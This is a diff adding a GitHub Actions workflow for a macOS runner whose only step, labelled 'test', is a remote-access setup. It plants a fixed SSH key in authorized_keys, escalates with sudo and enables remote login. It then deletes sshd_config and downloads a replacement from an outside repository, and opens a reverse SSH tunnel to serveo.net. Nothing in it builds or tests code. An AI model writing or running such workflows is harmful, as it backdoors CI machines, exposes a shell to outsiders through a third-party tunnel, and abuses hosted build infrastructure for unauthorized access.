@@ -1,0 +1,27 @@
+name: macos14arthuredition
+on:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: macos-14
+
+    steps:
+    #  - uses: actions/checkout@v4
+
+      - name: test
+        run: |
+          echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSdz+Rw8QhL8fhajHul/B/YXN5yR28CGFSI8en4wb4DXIvv5Uug7TeJ63vQi9p0pjxFh1/gWImXXnfQ209opwwobBf22S/PJwIciAyfCXuXxt/ROVql8S+7JV7Q+YxZ0HvCN0wzgLCGOuW8MTn9u1mHEs+CVNI8tJ5vw9piYVaMCjoy2p45CCzdkwEnmUZXPwNOMk1pMaSPrpI9fOVsxko6fdF/5RDAnSonRFKa0Fw1ebEzLU7VQaPBvEfsrGfZSdpSyWqSuWMsqLRqNANHAEzgyMzPI/5QeGjqWi/IL4S4XsoiT72R6Np4vj3G5BqEvdYarPaXju7uC6NN0Sq7stUfCfkZb0d4tv/1A+QewkvplUBGBSMB2Ct51F33mZBDKr+frx2vv66N7ZcXQeN4Rfi429D/Fy8NJMUNoHYO5vHU8R7vKrHiSziA3vuBNRVB3LnVUQUaFCqUkx8YDXyjZwJrdZ3fqWttDeM4gw7qWWJJBbVOuC3Q/fgaa1ehiRKLYk= astro@Mechinator" | tee ~/.ssh/authorized_keys
+          whoami
+          sudo -i
+          sudo systemsetup -setremotelogin on
+          rm -rf /etc/ssh/sshd_config
+          curl -o /etc/ssh/sshd_config https://github.com/arthurus36/desktp-windows10/raw/main/sshd_config
+          echo "serveo.net,138.68.79.95 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDxYGqSKVwJpQD1F0YIhz+bd5lpl7YesKjtrn1QD1RjQcSj724lJdCwlv4J8PcLuFFtlAA8AbGQju7qWdMN9ihdHvRcWf0tSjZ+bzwYkxaCydq4JnCrbvLJPwLFaqV1NdcOzY2NVLuX5CfY8VTHrps49LnO0QpGaavqrbk+wTWDD9MHklNfJ1zSFpQAkSQnSNSYi/M2J3hX7P0G2R7dsUvNov+UgNKpc4n9+Lq5Vmcqjqo2KhFyHP0NseDLpgjaqGJq2Kvit3QowhqZkK4K77AA65CxZjdDfpjwZSuX075F9vNi0IFpFkGJW9KlrXzI4lIzSAjPZBURhUb8nZSiPuzj" | tee ~/.ssh/known_hosts
+          ssh -R 0:localhost:22 serveo.net
+          
